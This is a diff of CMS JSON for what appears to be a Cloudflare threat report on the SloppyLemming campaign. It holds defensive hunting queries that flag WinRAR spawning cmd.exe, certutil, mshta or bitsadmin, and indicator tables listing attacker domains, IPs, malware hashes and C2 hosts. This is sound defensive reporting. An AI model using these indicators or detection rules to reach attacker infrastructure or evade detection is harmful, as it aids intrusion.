+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "5cwmACz0iQxuYTSJSWhk36",
+																	"locale": "en-US",
+																	"entryTitle": "Code Snippet Wrapper - 12",
+																	"markdown": "    DeviceProcessEvents\n    | where InitiatingProcessParentFileName has @\"winrar.exe\"\n    | where InitiatingProcessFileName has @\"cmd.exe\"\n    | project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, AccountName\n    | sort by Timestamp desc\n"
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
+														},
 														"uri": null
 													},
-													"value": "DeviceProcessEvents",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "| where InitiatingProcessParentFileName has @\"winrar.exe\"",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "| where InitiatingProcessFileName has @\"cmd.exe\"",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, AccountName",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "| sort by Timestamp desc",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
+													"value": null,
+													"marks": null,
+													"content": []
+												},
 												{
 													"nodeType": "text",
 													"data": {
@@ -7290,143 +4964,41 @@
 													"value": "",
 													"marks": [],
 													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
+												},
 												{
-													"nodeType": "text",
+													"nodeType": "embedded-entry-inline",
 													"data": {
-														"target": null,
+														"target": {
+															"sys": {
+																"id": "5cSHNZr5v8lwUDtVVV6VO8",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "5cSHNZr5v8lwUDtVVV6VO8",
+																	"locale": "en-US",
+																	"entryTitle": "Code Snippet Wrapper - 13",
+																	"markdown": "    | tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name=winrar.exe `windows_shells` OR Processes.process_name IN (\"certutil.exe\",\"mshta.exe\",\"bitsadmin.exe\") by Processes.dest Processes.user Processes.parent_process_name Processes.parent_process Processes.process_name Processes.process Processes.process_id Processes.parent_process_id \n    | `drop_dm_object_name(Processes)` \n    | `security_content_ctime(firstTime)` \n    | `security_content_ctime(lastTime)` \n    | `winrar_spawning_shell_application_filter`\n"
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
+														},
 														"uri": null
 													},
-													"value": "| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name=winrar.exe `windows_shells` OR Processes.process_name IN (\"certutil.exe\",\"mshta.exe\",\"bitsadmin.exe\") by Processes.dest Processes.user Processes.parent_process_name Processes.parent_process Processes.process_name Processes.process Processes.process_id Processes.parent_process_id ",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "| `drop_dm_object_name(Processes)` ",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "| `security_content_ctime(firstTime)` ",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "| `security_content_ctime(lastTime)` ",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "heading-5",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "| `winrar_spawning_shell_application_filter`",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
+													"value": null,
+													"marks": null,
+													"content": []
+												},
 												{
 													"nodeType": "text",
 													"data": {
@@ -7578,7 +5150,7 @@
 											]
 										},
 										{
-											"nodeType": "heading-2",
+											"nodeType": "heading-3",
 											"data": {
 												"target": null,
 												"uri": null
@@ -7900,7 +5472,7 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "Indicators of Compromise",
+													"value": "Indicators of compromise",
 													"marks": [],
 													"content": null
 												}
@@ -7921,128 +5493,97 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "SloppyLemming Infrastructure",
+													"value": "SloppyLemming infrastructure",
 													"marks": [],
 													"content": null
 												}
 											]
 										},
 										{
-											"nodeType": "embedded-asset-block",
+											"nodeType": "paragraph",
 											"data": {
-												"target": {
-													"sys": {
-														"id": "2UfbiYiWuVrIlC9KSbFyBS",
-														"type": "Link",
-														"linkType": "Asset"
-													},
-													"related_asset": [
-														{
-															"contentfulId": "2UfbiYiWuVrIlC9KSbFyBS",
-															"locale": "en-US",
-															"title": "SloppyLemming - image 7",
-															"file": {
-																"name": "image 8 - sloppylemming infrastructure.png",
-																"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/2UfbiYiWuVrIlC9KSbFyBS/edf1e4d31623dcb4fccdd43d0453df83/image_8_-_sloppylemming_infrastructure.png",
-																"internal": {
-																	"mediaType": "image/png"
-																}
-															}
-														}
-													],
-													"entry_elementMarkdown": [],
-													"entry_assetFile": [],
-													"entry_button": [],
-													"entry_elementLink": [],
-													"entry_page": [],
-													"entry_elementIcon": [],
-													"entry_bladeTable": [],
-													"entry_bladeThreeFeatures": [],
-													"entry_bladeFourFeatures": []
-												},
+												"target": null,
 												"uri": null
 											},
 											"value": null,
 											"marks": null,
-											"content": []
+											"content": [
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "",
+													"marks": [],
+													"content": null
+												}
+											]
 										},
 										{
-											"nodeType": "embedded-asset-block",
+											"nodeType": "paragraph",
 											"data": {
-												"target": {
-													"sys": {
-														"id": "224uf7B4GuWUWko8cAykUd",
-														"type": "Link",
-														"linkType": "Asset"
-													},
-													"related_asset": [
-														{
-															"contentfulId": "224uf7B4GuWUWko8cAykUd",
-															"locale": "en-US",
-															"title": "SloppyLemming - image 7a",
-															"file": {
-																"name": "image 9 - sloppylemming infrastructure 2.png",
-																"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/224uf7B4GuWUWko8cAykUd/c1afe5d0e79a27567c6faf1a04729c37/image_9_-_sloppylemming_infrastructure_2.png",
-																"internal": {
-																	"mediaType": "image/png"
-																}
-															}
-														}
-													],
-													"entry_elementMarkdown": [],
-													"entry_assetFile": [],
-													"entry_button": [],
-													"entry_elementLink": [],
-													"entry_page": [],
-													"entry_elementIcon": [],
-													"entry_bladeTable": [],
-													"entry_bladeThreeFeatures": [],
-													"entry_bladeFourFeatures": []
-												},
+												"target": null,
 												"uri": null
 											},
 											"value": null,
 											"marks": null,
-											"content": []
-										},
-										{
-											"nodeType": "embedded-asset-block",
-											"data": {
-												"target": {
-													"sys": {
-														"id": "6kz5QQ5lwoNiNcv8ZPNyN2",
-														"type": "Link",
-														"linkType": "Asset"
+											"content": [
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
 													},
-													"related_asset": [
-														{
-															"contentfulId": "6kz5QQ5lwoNiNcv8ZPNyN2",
-															"locale": "en-US",
-															"title": "SloppyLemming - image 7b",
-															"file": {
-																"name": "image 10 - sloppylemming infrastructure 3.png",
-																"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/6kz5QQ5lwoNiNcv8ZPNyN2/d6e089ce1c5b7548be1e168584b54ccd/image_10_-_sloppylemming_infrastructure_3.png",
-																"internal": {
-																	"mediaType": "image/png"
-																}
-															}
-														}
-													],
-													"entry_elementMarkdown": [],
-													"entry_assetFile": [],
-													"entry_button": [],
-													"entry_elementLink": [],
-													"entry_page": [],
-													"entry_elementIcon": [],
-													"entry_bladeTable": [],
-													"entry_bladeThreeFeatures": [],
-													"entry_bladeFourFeatures": []
+													"value": "",
+													"marks": [],
+													"content": null
 												},
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": []
+												{
+													"nodeType": "embedded-entry-inline",
+													"data": {
+														"target": {
+															"sys": {
+																"id": "59sWGfyuE75EdGwgNCrhs9",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "59sWGfyuE75EdGwgNCrhs9",
+																	"locale": "en-US",
+																	"entryTitle": "SloppyLemming Infrastructure - content table",
+																	"markdown": "\n|Date Observed    |Domain     |IP Address    |\n| ---------- | ---------- | ---------- |\n|2024-09-03T21:50:47Z      |crec-bd[.]site       |47.83.23.246       |\n|2024-09-03T21:48:50Z      |crec-bd[.]site      |47.83.23.246      |\n|2024-08-22T08:17:15Z       |jammycanonicalupdates[.]cloud      |159.65.6.251      |\n|2024-08-14T03:22:26Z      |locaal.navybd-gov[.]info       |139.59.109.136      |\n|2024-08-12T07:56:35Z       |maldevfudding[.]com      |37.27.41.167       |\n|2024-08-07T00:22:29Z       |openkm.paknavy-pk[.]org      |47.237.105.113     |\n|2024-07-23T23:47:21Z      |cloud.adobefileshare[.]com      |185.249.198.218     |\n|2024-07-23T23:41:37Z     | adobefileshare[.]com     |185.249.198.218      |\n|2024-07-15T03:51:55Z      |quran-books[.]store     |8.222.235.145     |\n| 2024-07-09T23:33:39Z       |aljazeerak[.]online       |8.219.169.226      |\n|2024-06-18T02:26:50Z       |redzone2.apl-org[.]online      |47.237.20.135       |\n|2024-06-13T03:26:55Z       |hurr.zapto[.]org       |47.237.20.135      |\n|2024-06-05T10:25:44Z       |login.apl-org[.]online      |47.245.56.29     |\n|2024-05-30T04:08:00Z      |helpdesk-lab[.]site      |47.237.20.201       |\n|2024-05-14T23:32:47Z      |owa-spamcheck.apl-org[.]online       |47.237.25.198      |\n|2024-04-30T23:29:42Z       |redzone.apl-org[.]online      |47.245.2.77      |\n|2024-04-30T23:28:35Z      |dawn.apl-org[.]online      |47.237.25.198       |\n|2024-03-28T01:52:34Z      |hit-pk[.]org       |208.85.22.252       |\n|2024-03-18T23:31:23Z       |blabla.apl-com[.]icu       |8.219.114.124      |\n|2024-03-14T02:53:22Z       |acrobat.paknavy-pk[.]org      |47.236.65.190       |\n|2024-03-14T02:40:17Z       |paknavy-pk[.]org       |47.236.65.190       |\n|2024-03-10T20:55:07Z       |mail.pakistangov[.]com       |47.245.114.11     |\n|2024-03-04T21:42:18Z       |mail.apl-com[.]icu       |47.236.65.190       |\n|2024-02-27T23:16:44Z      |168-gov[.]info      |47.76.61.241       |\n|2024-02-27T22:10:28Z      |168-gov[.]info       |47.76.61.241       |\n|2024-02-26T01:21:45Z       |browser.apl-org[.]online       |149.28.153.250       |\n|2024-02-20T03:43:03Z       |docs.apl-com[.]icu      |47.245.42.208       |\n|2024-02-07T22:54:18Z      |new.apl-org[.]online      |47.74.84.168       |\n|2024-01-31T02:11:32Z       |mozilla.apl-org[.]online       |47.74.87.155       |\n|2024-01-30T09:56:42Z       |m.opensecurity-legacy[.]com       |159.253.120.25       |\n|2024-01-30T09:56:28Z       |monitor.opensecurity-legacy[.]com       |159.253.120.25|\n|2024-01-30T09:56:17Z       |sensors.opensecurity-legacy[.]com       |159.253.120.25      |\n|2024-01-30T09:56:07Z       |static.opensecurity-legacy[.]com      |159.253.120.25       |\n|2024-01-28T08:22:07Z       |bin.opensecurity-legacy[.]com       |159.253.120.25       |\n|2024-01-28T08:09:48Z       |api.opensecurity-legacy[.]com       |159.253.120.25       |\n|2024-01-28T08:09:28Z       |frontend-m.opensecurity-legacy[.]com       |159.253.120.25       |\n|2024-01-28T08:09:16Z       |accounts.opensecurity-legacy[.]com     |159.253.120.25      |\n|2024-01-28T08:02:58Z       |opensecurity-legacy[.]com       |159.253.120.25       |\n|2024-01-09T21:14:22Z       |oil.hascolgov[.]info       |207.148.73.145       |\n|2024-01-03T22:21:14Z       |hesco.hascolgov[.]info       |207.148.73.145       |\n|2024-01-02T03:00:46Z       |locall.hascolgov[.]info       |207.148.73.145       |\n|2023-12-27T22:46:34Z       |itsupport-gov[.]com      |47.254.229.56       |\n|2023-12-18T01:00:57Z       |updpcn[.]online       |47.76.181.76       |\n|2023-12-17T22:17:47Z       |update.apl-org[.]online       |47.74.84.168       |\n|2023-12-05T22:27:17Z       |zero-berlin-covenant.apl-org[.]online      |47.245.126.218      |\n|2023-11-30T23:19:46Z       |fonts.apl-org[.]online       |47.74.87.155      |\n|2023-11-29T23:20:18Z      |localhost.apl-com[.]icu      |142.93.139.164      |\n|2023-11-15T22:45:35Z      |cloud.cflayerprotection[.]com      |45.137.116.8       |\n|2023-11-15T22:45:23Z       |secure.cflayerprotection[.]com      |45.137.116.8       |\n|2023-11-15T22:42:39Z      |cflayerprotection[.]com      |45.137.116.8      |\n|2023-10-15T23:44:47Z       |data[.]cloudlflares[.]com       |45.137.116.8       |\n|2023-10-15T23:44:20Z      |secure[.]cloudlflares[.]com      |45.137.116.8      |\n|2023-10-15T23:40:46Z      |cloudlflares[.]com      |45.137.116.8      |\n|2023-10-15T23:40:46Z      |www[.]cloudlflares[.]com      |45.137.116.8     |\n"
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
+														},
+														"uri": null
+													},
+													"value": null,
+													"marks": null,
+													"content": []
+												},
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "",
+													"marks": [],
+													"content": null
+												}
+											]
 										},
 										{
 											"nodeType": "paragraph",
@@ -8080,50 +5621,97 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "SloppyLemming Malware Samples",
+													"value": "SloppyLemming malware samples",
 													"marks": [],
 													"content": null
 												}
 											]
 										},
 										{
-											"nodeType": "embedded-asset-block",
+											"nodeType": "paragraph",
 											"data": {
-												"target": {
-													"sys": {
-														"id": "6qJGOuEt20iSdp7Y7uFGIi",
-														"type": "Link",
-														"linkType": "Asset"
-													},
-													"related_asset": [
-														{
-															"contentfulId": "6qJGOuEt20iSdp7Y7uFGIi",
-															"locale": "en-US",
-															"title": "SloppyLemming - image 11",
-															"file": {
-																"name": "image 11 - malware samples.png",
-																"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/6qJGOuEt20iSdp7Y7uFGIi/66265cd06389c558d612520358077f38/image_11_-_malware_samples.png",
-																"internal": {
-																	"mediaType": "image/png"
-																}
-															}
-														}
-													],
-													"entry_elementMarkdown": [],
-													"entry_assetFile": [],
-													"entry_button": [],
-													"entry_elementLink": [],
-													"entry_page": [],
-													"entry_elementIcon": [],
-													"entry_bladeTable": [],
-													"entry_bladeThreeFeatures": [],
-													"entry_bladeFourFeatures": []
-												},
+												"target": null,
 												"uri": null
 											},
 											"value": null,
 											"marks": null,
-											"content": []
+											"content": [
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "",
+													"marks": [],
+													"content": null
+												}
+											]
+										},
+										{
+											"nodeType": "paragraph",
+											"data": {
+												"target": null,
+												"uri": null
+											},
+											"value": null,
+											"marks": null,
+											"content": [
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "",
+													"marks": [],
+													"content": null
+												},
+												{
+													"nodeType": "embedded-entry-inline",
+													"data": {
+														"target": {
+															"sys": {
+																"id": "29W9ttTKbN21WfZc3rF6RE",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "29W9ttTKbN21WfZc3rF6RE",
+																	"locale": "en-US",
+																	"entryTitle": "SloppyLemming Malware Samples - Content table",
+																	"markdown": "\n|SHA256 Hash    |Filename    |C2 Address    |\n| ---------- | ---------- | ---------- |\n|06f82a8d80ec911498e3493ebefa8ad45e102 dd887ce2edc11f8f51bafab2e80    |sspicli.dll|pitb.gov-pkgov.workers[.]dev|\n|ac3dff91982709f575cfbc6954b61130b4eeab 5d3759772db220f1b76836be4d      |profapi.dll|pitb.gov-pkgov.workers[.]dev|\n|3dfb8d198de95090e2ad3ffc9d9846af5c3074 563acb0ce5b0ef62b20e4bf432      |profapis.dll|pitb.gov-pkgov.workers[.]dev|\n|82e99ceea9e6d31555b0f2bf637318fd97e56 09e3d4d1341aec39db2e26cf211|CRYPTSP.dll|N/A|\n|b6ae5b714f18ca40a111498d0991e1e30cd9 5317b4904d2ef0d49937f0552000     |Outlook.eml/ NekroWire.dll|redzone.apl-org[.]online|\n"
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
+														},
+														"uri": null
+													},
+													"value": null,
+													"marks": null,
+													"content": []
+												},
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "",
+													"marks": [],
+													"content": null
+												}
+											]
 										},
 										{
 											"nodeType": "paragraph",
@@ -8161,7 +5749,7 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "Mitigated SloppyLemming Workers Domains",
+													"value": "Mitigated SloppyLemming Workers domains",
 													"marks": [],
 													"content": null
 												}
@@ -8702,29 +6290,20 @@
 						]
 					},
 					{
-						"contentfulId": "TbB3QvIrlrqigvkfTxH0v",
-						"contentTypeId": "bladeLeadGeneration",
+						"contentTypeId": "bladeEnablement",
+						"contentfulId": "sJEzP8w5T5I0ktN2sVdmC",
 						"title": "Get updates from Cloudforce One",
-						"description": "Get updates from Cloudforce One",
-						"variant": "inline",
+						"titleSize": "medium",
+						"backgroundColor": "image-background",
+						"buttonText": null,
+						"buttonUrl": null,
+						"buttonText2": null,
+						"buttonModalId2": null,
+						"buttonUrl2": null,
+						"bladeSizeType": "small",
 						"htmlId": null,
-						"sectionPadding": null,
-						"backgroundImage": {
-							"id": "4526a0e7-98ff-58c2-a6a8-10324e3c2948",
-							"altText": "Generic Lead Generation background",
-							"title": "Generic Lead Generation background",
-							"activeAsset": "Contentful Asset",
-							"locale": "en-US",
-							"contentfulAsset": {
-								"file": {
-									"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/7GXH7p3scfTG26xKndTZ0Z/fb56c78967ff82b1633b9f5386f1605f/Lead-generation-background-generic.png"
-								},
-								"description": "Lead generation background generic"
-							},
-							"brandfolderAsset": null,
-							"brandfolderAssetMobile": null
-						},
-						"primaryCtaButton": {
+						"bladeBorder": "none",
+						"buttonOne": {
 							"buttonAssetFile": null,
 							"buttonTextLoggedIn": null,
 							"contentTypeId": "button",
@@ -8777,7 +6356,9 @@
 							"openInNewTab": false,
 							"locale": "en-US"
 						},
-						"secondaryCtaButton": null
+						"buttonTwo": null,
+						"sectionPadding": null,
+						"eyebrow": null
 					},
 					{
 						"contentTypeId": "bladeHtml",
@@ -8796,12 +6377,12 @@
 						"columnContent": [
 							{
 								"contentTypeId": "feature",
-								"contentfulId": "7LvrG5A9JQzP2ufBsptuRc",
-								"title": "Freight fraud - Campaign snapshot",
+								"contentfulId": "4cyn8AN5KypAODyiKDXoIz",
+								"title": "Freight fraud surge: global supply chain compromises",
 								"makeTitleLink": false,
 								"titleUrl": null,
 								"titleSize": null,
-								"description": "Threat brief",
+								"description": "Campaign snapshot",
 								"learnMoreUrl": "threat-intelligence/research/report/freight-fraud-surge-global-supply-chain-compromises",
 								"learnMoreText": "Read now",
 								"displayBorder": false,
@@ -8874,7 +6455,7 @@
 								"titleUrl": null,
 								"titleSize": null,
 								"description": "Campaign snapshot",
-								"learnMoreUrl": "#",
+								"learnMoreUrl": "/threat-intelligence/research/report/impersonation-is-fooling-the-enterprise/",
 								"learnMoreText": "Read now",
 								"displayBorder": false,
 								"openLinkInNewTab": null,
@@ -8891,7 +6472,7 @@
 									"locale": "en-US",
 									"contentfulAsset": {
 										"file": {
-											"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/5hzwUJFR1xnKUnyjoUdzYZ/feb5a41c45dc54c849acb324fd1356eb/image_5.png"
+											"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/7bvTclIhsaz4xgWvevZ10f/50ca442a1a167753fdc9e96f28129fed/Impersonation_attacks.png"
 										},
 										"description": "Impersonation is fooling the enterprise"
 									},
@@ -8904,6 +6485,18 @@
 							}
 						],
 						"sectionPadding": null,
+						"htmlId": null
+					},
+					{
+						"contentTypeId": "bladeHtml",
+						"contentfulId": "6fDQyZBRKFs5bsitxGDHcq",
+						"htmlContent": null,
+						"htmlId": null
+					},
+					{
+						"contentTypeId": "bladeHtml",
+						"contentfulId": "5dJ4cV38B5LEXNdGvzUuRi",
+						"htmlContent": "<style>\n  code {\n    display: block;\n    background-color: #f1f3f4;\n    padding: 20px;\n    border-radius: 8px;\n    text-wrap: wrap;\n  }\n</style>",
 						"htmlId": null
 					}
 				],
